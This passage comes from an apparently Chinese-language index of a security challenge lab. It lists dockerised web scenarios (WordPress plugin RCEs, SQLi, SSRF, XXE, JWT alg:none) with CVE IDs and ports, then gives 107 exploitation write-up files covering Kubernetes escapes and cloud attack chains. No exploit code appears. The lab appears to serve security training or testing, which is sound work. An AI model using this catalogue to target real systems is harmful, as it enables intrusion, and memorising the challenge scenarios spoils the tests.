| web-03 | WEB-03 | WordPress Simple File List RCE | docker | L1 | CVE-2025-34085 | 10103 | `docker/web/wordpress-simple-file-list` |
| web-04 | WEB-04 | WordPress WPBookit RCE | docker | L1 | CVE-2025-6058 | 10104 | `docker/web/wordpress-wpbookit` |
| web-05 | WEB-05 | WordPress Copypress JWT RCE | docker | L2 | CVE-2025-8625 | 10105 | `docker/web/wordpress-jwt-copypress` |
| web-06 | WEB-06 | PHP LFI to RCE (Jupiter X Core) | docker | L2 | CVE-2025-0366 | 10106 | `docker/web/wordpress-jupiterx-lfi` |
| web-07 | WEB-07 | PostgreSQL Encoding Bypass SQLi | docker | L2 | CVE-2025-1094 | 10107 | `docker/web/postgres-sqli` |
| web-08 | WEB-08 | MySQL UDF Privilege Escalation | docker | L3 | MySQL UDF Abuse | 10108 | `docker/web/mysql-udf` |
| web-09 | WEB-09 | MSSQL xp_cmdshell Command Execution | docker | L2 | MSSQL xp_cmdshell | 10109 | `docker/web/mssql-xp-cmdshell` |
| web-10 | WEB-10 | SSRF Internal Service Access | docker | L1 | N/A (SSRF misconfiguration) | 10110 | `docker/web/ssrf-internal` |
| web-11 | WEB-11 | SSRF Localhost Auth Bypass | docker | L2 | N/A (SSRF misconfiguration) | 10111 | `docker/web/ssrf-localhost` |
| web-12 | WEB-12 | SSTI Jinja2 Template Injection | docker | L2 | N/A (SSTI vulnerability) | 10112 | `docker/web/ssti-jinja2` |
| web-13 | WEB-13 | XXE XML External Entity | docker | L1 | XXE (XML External Entity) | 10113 | `docker/web/xxe-basic` |
| web-14 | WEB-14 | XXE SVG Upload | docker | L2 | XXE (XML External Entity) | 10114 | `docker/web/xxe-svg` |
| web-15 | WEB-15 | JWT Algorithm None Attack | docker | L2 | JWT alg:none | 10115 | `docker/web/jwt-alg-none` |
| web-16 | WEB-16 | GraphQL Introspection + IDOR | docker | L2 | GraphQL introspection + IDOR | 10116 | `docker/web/graphql-idor` |
| web-17 | WEB-17 | PHP Deserialization Auth Bypass | docker | L2 | Insecure PHP deserialization | 10117 | `docker/web/php-deserialization` |
| web-18 | WEB-18 | Stored XSS Session Theft | docker | L1 | Stored XSS | 10118 | `docker/web/xss-stored` |

## 附录 B：源文件索引

共 **107** 个源文件纳入本汇总。

| 源文件 | 汇总章节 |
|--------|----------|
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-03 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-04 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-01 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-02 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-12 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-07 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-08 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-09 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-06 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-10 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-11 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-13 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-14 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-05 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-15 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-17 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-16 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / WEB-18 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-05 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-06 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-01 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-02 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-03 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-04 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-07 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-08 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / DB-09 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-01 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-04 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-06 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-05 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-07 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-08 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-09 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-10 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-11 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-12 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-13 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-14 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-15 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-16 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-17 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-18 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-20 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-21 |
| `cve_challenges/docs/scenarios/docker-scenarios-exploitation.md` | 1.1 Docker / CLOUD-22 |
| `cve_challenges/docs/scenarios/k8s/k8s-01-runc-workdir-exploitation.md` | 1.2 K8s / K8S-01 |
| `cve_challenges/docs/scenarios/k8s/k8s-02-runc-devnull-exploitation.md` | 1.2 K8s / K8S-02 |
| `cve_challenges/docs/scenarios/k8s/k8s-03-runc-lsm-bypass-exploitation.md` | 1.2 K8s / K8S-03 |
| `cve_challenges/docs/scenarios/k8s/k8s-11-privileged-breakout-exploitation.md` | 1.2 K8s / K8S-11 |
| `cve_challenges/docs/scenarios/k8s/k8s-14-cap-sys-admin-exploitation.md` | 1.2 K8s / K8S-14 |
| `cve_challenges/docs/scenarios/k8s/k8s-19-ptrace-inject-exploitation.md` | 1.2 K8s / K8S-19 |
| `cve_challenges/docs/scenarios/k8s/cloud-02-cap-netraw-exploitation.md` | 1.2 K8s / CLOUD-02 |
| `cve_challenges/docs/scenarios/k8s/cloud-03-sa-cross-ns-exploitation.md` | 1.2 K8s / CLOUD-03 |
| `cve_challenges/docs/scenarios/k8s/cloud-19-multitenant-exploitation.md` | 1.2 K8s / CLOUD-19 |
| `cve_challenges/docs/scenarios/k8s/k8s-12-hostpath-escape-exploitation.md` | 1.2 K8s / K8S-12 |
| `cve_challenges/docs/scenarios/k8s/k8s-16-cri-socket-exploitation.md` | 1.2 K8s / K8S-16 |
| `cve_challenges/docs/scenarios/k8s/k8s-17-docker-socket-exploitation.md` | 1.2 K8s / K8S-17 |
| `cve_challenges/docs/scenarios/k8s/k8s-23-seccomp-bypass-exploitation.md` | 1.2 K8s / K8S-23 |
| `cve_challenges/docs/scenarios/k8s/k8s-05-gitrepo-exploitation.md` | 1.2 K8s / K8S-05 |
| `cve_challenges/docs/scenarios/k8s/k8s-06-rbac-secrets-exploitation.md` | 1.2 K8s / K8S-06 |
| `cve_challenges/docs/scenarios/k8s/k8s-10-helm-tiller-exploitation.md` | 1.2 K8s / K8S-10 |
| `cve_challenges/docs/scenarios/k8s/k8s-13-sa-cross-ns-exploitation.md` | 1.2 K8s / K8S-13 |
| `cve_challenges/docs/scenarios/k8s/k8s-18-sa-cluster-admin-exploitation.md` | 1.2 K8s / K8S-18 |
| `cve_challenges/docs/scenarios/k8s/k8s-08-etcd-unauth-exploitation.md` | 1.2 K8s / K8S-08 |
| `cve_challenges/docs/scenarios/k8s/k8s-09-registry-poison-exploitation.md` | 1.2 K8s / K8S-09 |
| `cve_challenges/docs/scenarios/k8s/k8s-22-externalip-hijack-exploitation.md` | 1.2 K8s / K8S-22 |
| `cve_challenges/docs/scenarios/k8s/k8s-24-localhost-bypass-exploitation.md` | 1.2 K8s / K8S-24 |
| `cve_challenges/docs/scenarios/k8s/k8s-26-node-redirect-exploitation.md` | 1.2 K8s / K8S-26 |
| `cve_challenges/docs/scenarios/k8s/k8s-27-networkpolicy-bypass-exploitation.md` | 1.2 K8s / K8S-27 |
| `cve_challenges/docs/scenarios/k8s/k8s-21-ingress-snippet-exploitation.md` | 1.2 K8s / K8S-21 |
| `cve_challenges/docs/scenarios/k8s/k8s-20-ingress-nginx-rce-exploitation.md` | 1.2 K8s / K8S-20 |
| `cve_challenges/docs/scenarios/k8s/k8s-25-webhook-inject-exploitation.md` | 1.2 K8s / K8S-25 |
| `cve_challenges/docs/scenarios/k8s/k8s-28-node-selector-exploitation.md` | 1.2 K8s / K8S-28 |
| `cve_challenges/docs/scenarios/k8s/k8s-29-toleration-exploitation.md` | 1.2 K8s / K8S-29 |
| `cve_challenges/docs/scenarios/k8s/k8s-30-cni-ip-spoof-exploitation.md` | 1.2 K8s / K8S-30 |
| `cve_challenges/docs/scenarios/k8s/k8s-15-mutable-image-exploitation.md` | 1.2 K8s / K8S-15 |
| `cve_challenges/docs/scenarios/k8s/k8s-07-kubelet-unauth-exploitation.md` | 1.2 K8s / K8S-07 |
| `cve_challenges/docs/chains/container-to-admin-exploitation.md` | 二、攻击链 / container-to-admin |
| `cve_challenges/docs/chains/caps-to-cluster-exploitation.md` | 二、攻击链 / caps-to-cluster |
| `cve_challenges/docs/chains/cri-to-etcd-exploitation.md` | 二、攻击链 / cri-to-etcd |
| `cve_challenges/docs/chains/docker-to-etcd-exploitation.md` | 二、攻击链 / docker-to-etcd |
| `cve_challenges/docs/chains/externalip-to-secrets-exploitation.md` | 二、攻击链 / externalip-to-secrets |
| `cve_challenges/docs/chains/hostpath-to-daemonset-exploitation.md` | 二、攻击链 / hostpath-to-daemonset |
| `cve_challenges/docs/chains/ingress-to-etcd-exploitation.md` | 二、攻击链 / ingress-to-etcd |
| `cve_challenges/docs/chains/kubelet-to-etcd-exploitation.md` | 二、攻击链 / kubelet-to-etcd |
| `cve_challenges/docs/chains/privilege-to-etcd-exploitation.md` | 二、攻击链 / privilege-to-etcd |
| `cve_challenges/docs/chains/sa-lateral-escape-exploitation.md` | 二、攻击链 / sa-lateral-escape |
| `cve_challenges/docs/chains/seccomp-to-escape-exploitation.md` | 二、攻击链 / seccomp-to-escape |
| `cve_challenges/docs/chains/ssrf-to-cross-account-exploitation.md` | 二、攻击链 / ssrf-to-cross-account |
| `cve_challenges/docs/chains/lambda-to-cross-account-exploitation.md` | 二、攻击链 / lambda-to-cross-account |
| `cve_challenges/docs/chains/ci-to-oidc-exploitation.md` | 二、攻击链 / ci-to-oidc |
| `cve_challenges/docs/chains/db-to-cross-account-exploitation.md` | 二、攻击链 / db-to-cross-account |
| `cve_challenges/docs/chains/s3-to-cf-exploitation.md` | 二、攻击链 / s3-to-cf |
| `cve_challenges/docs/chains/gateway-to-deputy-exploitation.md` | 二、攻击链 / gateway-to-deputy |
| `cve_challenges/docs/chains/notebook-to-scp-exploitation.md` | 二、攻击链 / notebook-to-scp |
| `cve_challenges/docs/chains/ssrf-to-oidc-exploitation.md` | 二、攻击链 / ssrf-to-oidc |
| `cve_challenges/docs/chains/db-to-passrole-exploitation.md` | 二、攻击链 / db-to-passrole |
| `cve_challenges/docs/chains/cf-to-scp-exploitation.md` | 二、攻击链 / cf-to-scp |
| `cve_challenges/docs/chains/loggap-to-s3-stealth-exploitation.md` | 二、攻击链 / loggap-to-s3-stealth |
| `cve_challenges/docs/chains/svctag-to-imds-to-deputy-exploitation.md` | 二、攻击链 / svctag-to-imds-to-deputy |
| `cve_challenges/docs/chains/web-to-db-to-cross-account-exploitation.md` | 二、攻击链 / web-to-db-to-cross-account |
| `cve_challenges/docs/chains/xxe-to-es-exploitation.md` | 二、攻击链 / xxe-to-es |
| `cve_challenges/docs/chains/php-to-mongo-exploitation.md` | 二、攻击链 / php-to-mongo |
| `cve_challenges/docs/chains/redis-to-k8s-exploitation.md` | 二、攻击链 / redis-to-k8s |
| `cve_challenges/docs/chains/wp-lfi-to-cluster-exploitation.md` | 二、攻击链 / wp-lfi-to-cluster |
| `cve_challenges/docs/chains/pg-sqli-to-node-exploitation.md` | 二、攻击链 / pg-sqli-to-node |
